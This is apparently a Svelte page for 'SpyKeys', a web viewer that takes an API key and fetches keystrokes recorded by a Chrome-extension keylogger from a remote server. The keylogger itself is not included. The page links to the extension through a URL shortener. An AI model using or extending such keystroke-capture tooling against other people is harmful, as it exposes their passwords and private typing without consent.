<script>
	import Articles from "./articles.svelte";
	const urlParams = new URLSearchParams(window.location.search);
	const key = urlParams.get("apiKey");
  
	let articles;
	let x = 585;
	let apiMatched = false,
	  apiInp = key;
	export let contentLength = 10;
	let temp_articles;
  
	document.addEventListener("DOMContentLoaded", function () {
	  var elems = document.querySelectorAll(".tooltipped");
	  var elems2 = document.querySelectorAll(".fixed-action-btn");
	  var instances = M.Tooltip.init(elems);
	  var instances = M.FloatingActionButton.init(elems2);
  
	  if (key) document.querySelector(".search-bar").style.background = "#fdf8a3";
	});
  
	const loadMore = (elem) => {
	  if (elem.scrollTop >= elem.scrollHeight - x) {
		contentLength += 10;
	  }
	};
  
	const handleSearch = async () => {
	  document.querySelector(".search-btn").classList.remove("pulse");
	  document.querySelector(".search-bar").style.background = "#fff";
  
	  if (!(apiInp.trim().length == 0)) {
		apiMatched = true;
  
		await fetch("https://api-spykeys.herokuapp.com/", {
		  method: "GET",
		  mode: "cors",
		  cache: "no-cache",
		  credentials: "same-origin",
		  headers: {
			"x-api-key": `${apiInp.trim()}`,
		  },
		}).then((res) => {
		  if (!(res.status == 403)) {
			res.json().then((data) => {
			  if (data.logs) {
				articles = data.logs;
				temp_articles = articles;
			  } else
				articles = [
				  {
					domain: "NO_DATA",
					text: "This collection is currently inactive",
					timestamp: `${new Date()
					  .getTime()
					  .toString()
					  .substring(0, 10)}`,
				  },
				];
			});
		  } else {
			articles = [
			  {
				domain: "403 (FORBIDDEN)",
				text: "Invalid API Key entered.",
				timestamp: `${new Date().getTime().toString().substring(0, 10)}`,
			  },
			];
		  }
		});
	  }
	};
  </script>
  
  <div class="material-page">
	<nav class="indigo lighten-1" role="navigation">
	  <div class="nav-wrapper container">
		<a
		  id="logo-container"
		  href="https://spykeys.herokuapp.com"
		  class="brand-logo"
		  ><i class="material-icons" style="font-size: larger;">visibility</i> Spy
		  Keys</a
		>
	  </div>
	</nav>
	<div class="section no-pad-bot" id="index-banner">
	  <div class="container">
		<br /><br />
		<h1 class="header center black-text">
		  <img src="assets/spy-keys-logo.png" alt="Spy Keys" />
		</h1>
		<div class="row center">
		  <h5 class="header col s12 light">
			<svg style="display: none">
			  <symbol id="magnify" viewBox="0 0 18 18" height="100%" width="100%">
				<path
				  d="M12.5 11h-.8l-.3-.3c1-1.1 1.6-2.6 1.6-4.2C13 2.9 10.1 0          6.5 0S0 2.9 0 6.5 2.9 13 6.5 13c1.6 0 3.1-.6 4.2-1.6l.3.3v.8l5 5          1.5-1.5-5-5zm-6 0C4 11 2 9 2 6.5S4 2 6.5 2 11 4 11 6.5 9 11 6.5            11z"
				  fill="#fff"
				  fill-rule="evenodd"
				/>
			  </symbol>
			</svg>
  
			<div
			  class="search-bar tooltipped"
			  data-position="bottom"
			  data-tooltip="Your secret API key can be copied from SpyKeys chrome extension"
			>
			  <input
				type="text"
				class="input"
				placeholder="&nbsp;"
				bind:value={apiInp}
			  />
			  <span class="label">Your API Key</span>
			  <span class="highlight" />
			  <div
				class="btn-large pulse waves-effect waves-light search-btn"
				on:click={handleSearch}
			  >
				<svg class="icon icon-18">
				  <use xlink:href="#magnify" />
				</svg>
			  </div>
			</div>
		  </h5>
		</div>
  
		<div class="divider">OR</div>
  
		<div class="row center">
		  <a
			href="http://tinyurl.com/INSTALL-SPYKEYS-CHROME-EXTENSION"
			id="download-button"
			class="btn-large black secondary-button">Generate New</a
		  >
		</div>
		<br /><br />
	  </div>
	</div>
  
	{#if apiMatched}
	  <div
		class="container center fetch-container"
		on:scroll={() => loadMore(document.querySelector(".fetch-container"))}
	  >
		<div class="section">
		  <!--   Icon Section   -->
		  <div class="col striped">
			<main>
			  <Articles {articles} {contentLength} {temp_articles} />
			</main>
		  </div>
		</div>
		<br /><br />
	  </div>
	{/if}
  
	<footer class="page-footer black">
	  <div class="container">
		<div class="row">
		  <div class="col l6 s12">
			<h5 class="white-text heading">
			  <span class="material-icons"> help </span><span>
				About SpyKeys</span
			  >
			</h5>
			<p class="grey-text text-lighten-4">
			  SpyKeys is a chrome extension and a real-time keylogger that logs
			  alpha-numeric and symbol keys and saves them in a remote database
			  with your auto-generated API Key so it can be accessed anywhere by
			  SpyKeys web app. Users have full access to their data and may delete
			  it entirely at anytime they want
			</p>
		  </div>
		  <div class="col l3 s12">
			<h5 class="white-text heading">
			  <span><span class="material-icons"> face </span> About Me</span>
			</h5>
			<p class="grey-text text-lighten-4">
			  I am a Full-stack developer and Ethical hacker. I code for fun.
			</p>
		  </div>
		  <div class="col l3 s12">
			<h5 class="white-text heading">
			  <span><span class="material-icons"> link </span> Connect</span>
			</h5>
			<ul>
			  <li>
				<a class="white-text" href="https://instagram.com/raz0229"
				  >Instagram</a
				>
			  </li>
			  <li>
				<a class="white-text" href="https://twitter.com/raz0229"
				  >Twitter</a
				>
			  </li>
			  <li>
				<a class="white-text" href="https://goo.gl/CZuiMY">YouTube</a>
			  </li>
			  <li>
				<a class="white-text" href="https://facebook.com/raz0229"
				  >Facebook</a
				>
			  </li>
			  <li>
				<a class="white-text" href="https://reddit.com/u/raz0229"
				  >Reddit</a
				>
			  </li>
			  <li>
				<a class="white-text" href="https://github.com/raz0229">GitHub</a>
			  </li>
			</ul>
		  </div>
		</div>
	  </div>
	  <div class="footer-copyright">
		<div class="container">
		  ❤️ Made by <a
			class="indigo-text text-lighten-3"
			href="http://raz0229.github.io"><em>@raz0229</em></a
		  >
		</div>
	  </div>
	</footer>
  </div>
  
  <div class="fixed-action-btn">
	<a class="btn-floating btn-large black">
	  <i class="large material-icons">link</i>
	</a>
	<ul>
	  <li>
		<a class="btn-floating red" href="http://goo.gl/CZuiMY"
		  ><svg
			class="mysvg svg-inline--fa fa-youtube fa-w-18"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="youtube"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 576 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M549.655 124.083c-6.281-23.65-24.787-42.276-48.284-48.597C458.781 64 288 64 288 64S117.22 64 74.629 75.486c-23.497 6.322-42.003 24.947-48.284 48.597-11.412 42.867-11.412 132.305-11.412 132.305s0 89.438 11.412 132.305c6.281 23.65 24.787 41.5 48.284 47.821C117.22 448 288 448 288 448s170.78 0 213.371-11.486c23.497-6.321 42.003-24.171 48.284-47.821 11.412-42.867 11.412-132.305 11.412-132.305s0-89.438-11.412-132.305zm-317.51 213.508V175.185l142.739 81.205-142.739 81.201z"
			/></svg
		  ></a
		>
	  </li>
	  <li>
		<a class="btn-floating pink darken-1" href="https://instagram.com/raz0229"
		  ><svg
			class="mysvg svg-inline--fa fa-instagram fa-w-14"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="instagram"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 448 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"
			/></svg
		  ></a
		>
	  </li>
	  <li>
		<a class="btn-floating blue" href="https://twitter.com/raz0229"
		  ><svg
			class="mysvg svg-inline--fa fa-twitter fa-w-16"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="twitter"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 512 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"
			/></svg
		  ></a
		>
	  </li>
	  <li>
		<a class="btn-floating indigo" href="https://facebook.com/raz0229"
		  ><svg
			class="mysvg svg-inline--fa fa-facebook-f fa-w-10"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="facebook-f"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 320 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M279.14 288l14.22-92.66h-88.91v-60.13c0-25.35 12.42-50.06 52.24-50.06h40.42V6.26S260.43 0 225.36 0c-73.22 0-121.08 44.38-121.08 124.72v70.62H22.89V288h81.39v224h100.17V288z"
			/></svg
		  ></a
		>
	  </li>
	  <li>
		<a class="btn-floating grey" href="https://github.com/raz0229/spykeys-web"
		  ><svg
			class="mysvg svg-inline--fa fa-github fa-w-16"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="github"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 496 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"
			/></svg
		  ></a
		>
	  </li>
	  <li>
		<a class="btn-floating orange" href="https://reddit.com/u/raz0229"
		  ><svg
			class="mysvg svg-inline--fa fa-reddit fa-w-16"
			aria-hidden="true"
			focusable="false"
			data-prefix="fab"
			data-icon="reddit"
			role="img"
			xmlns="http://www.w3.org/2000/svg"
			viewBox="0 0 512 512"
			data-fa-i2svg=""
			><path
			  fill="currentColor"
			  d="M201.5 305.5c-13.8 0-24.9-11.1-24.9-24.6 0-13.8 11.1-24.9 24.9-24.9 13.6 0 24.6 11.1 24.6 24.9 0 13.6-11.1 24.6-24.6 24.6zM504 256c0 137-111 248-248 248S8 393 8 256 119 8 256 8s248 111 248 248zm-132.3-41.2c-9.4 0-17.7 3.9-23.8 10-22.4-15.5-52.6-25.5-86.1-26.6l17.4-78.3 55.4 12.5c0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.3 24.9-24.9s-11.1-24.9-24.9-24.9c-9.7 0-18 5.8-22.1 13.8l-61.2-13.6c-3-.8-6.1 1.4-6.9 4.4l-19.1 86.4c-33.2 1.4-63.1 11.3-85.5 26.8-6.1-6.4-14.7-10.2-24.1-10.2-34.9 0-46.3 46.9-14.4 62.8-1.1 5-1.7 10.2-1.7 15.5 0 52.6 59.2 95.2 132 95.2 73.1 0 132.3-42.6 132.3-95.2 0-5.3-.6-10.8-1.9-15.8 31.3-16 19.8-62.5-14.9-62.5zM302.8 331c-18.2 18.2-76.1 17.9-93.6 0-2.2-2.2-6.1-2.2-8.3 0-2.5 2.5-2.5 6.4 0 8.6 22.8 22.8 87.3 22.8 110.2 0 2.5-2.2 2.5-6.1 0-8.6-2.2-2.2-6.1-2.2-8.3 0zm7.7-75c-13.6 0-24.6 11.1-24.6 24.9 0 13.6 11.1 24.6 24.6 24.6 13.8 0 24.9-11.1 24.9-24.6 0-13.8-11-24.9-24.9-24.9z"
			/></svg
		  ></a
		>
	  </li>
	</ul>
  </div>
  
  <style>
	@import url("https://fonts.googleapis.com/css2?family=Quicksand&display=swap");
	@import url(https://fonts.googleapis.com/css?family=Open+Sans+Condensed:300);
  
	:global(body) {
	  background-color: #f7f7f7;
	  font-family: "Quicksand", sans-serif;
	}
  
	.mysvg {
	  width: 60%;
	  margin-top: 8px;
	}
  
	.search-bar {
	  height: 60px;
	  width: 100%;
	  border-radius: 40px;
	  margin-top: 1.75rem;
	  display: flex;
	  align-items: center;
	  padding: 0 0 0 20px;
	  position: relative;
	  background: #fff;
	}
  
	.input {
	  border: none;
	  height: 50px;
	  width: 100%;
	  color: #1b1b1b;
	  font-size: 15px;
	  outline: none;
	}
  
	.heading {
	  display: flex;
	  gap: 10px;
	}
  
	.input:not(:placeholder-shown) + .label {
	  font-size: 15px;
	  top: -10px;
	  color: #00c853;
	}
  
	.input:focus ~ .label {
	  font-size: 15px;
	  top: -10px;
	  color: #4279a3;
	  transition: all 0.5s ease;
	}
  
	a {
	  text-decoration: none;
	  color: #fff;
	}
  
	.fetch-container {
	  background: #fff;
	  max-height: 600px;
	  overflow: scroll;
	}
  
	.label {
	  color: #aaaaaa;
	  position: absolute;
	  top: 13px;
	  pointer-events: none;
	  transition: all 0.5s ease;
	}
  
	.search-btn {
	  background: #3f51b5;
	  border-radius: 20px;
	  height: 40px;
	  min-width: 40px;
	  display: flex;
	  align-items: center;
	  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.12), 0 1px 2px rgba(0, 0, 0, 0.24);
	  justify-content: center;
	  cursor: pointer;
	  right: 1rem;
	  top: 10px;
	  position: absolute;
	  transition: all 0.5s ease;
	}
	.search-btn:hover {
	  background: #323858;
	}
  
	.secondary-button {
	  border: solid 2px rgba(0, 0, 255, 0.5) !important;
	}
  
	.icon {
	  display: inline-flex;
	}
	.header img {
	  width: 350px;
	  height: 65%;
	}
	.icon-18 {
	  width: 22px;
	  height: 22px;
	}
  
	.highlight {
	  width: 0px;
	  height: 2px;
	  position: absolute;
	  bottom: 10px;
	  transition: all 1s ease;
	}
  
	.input:focus ~ .highlight {
	  width: 90%;
	  transition: all 1s ease;
	}
  
	.page-footer {
	  margin-top: 2.5rem;
	}
  
	/*
	Line Divider
	*/
  
	.divider {
	  overflow: visible !important;
	  display: flex;
	  margin-bottom: 2rem;
	  align-items: center;
	  justify-content: center;
	  white-space: nowrap;
	  text-transform: uppercase;
	  font-family: "Open Sans Condensed";
	}
  
	@media screen and (max-width: 699px) {
	  .header img {
		width: 250px;
	  }
	}
	@media screen and (max-width: 389px) {
	  nav .brand-logo {
		left: 43% !important;
	  }
	}
  
	/*
  Scroll bar
  */
	/* width */
	::-webkit-scrollbar {
	  width: 10px;
	}
  
	/* Track */
	::-webkit-scrollbar-track {
	  background: #f1f1f1;
	}
  
	/* Handle */
	::-webkit-scrollbar-thumb {
	  background: #8790c3;
	}
  
	/* Handle on hover */
	::-webkit-scrollbar-thumb:hover {
	  background: #3d4364;
	}
  </style>
  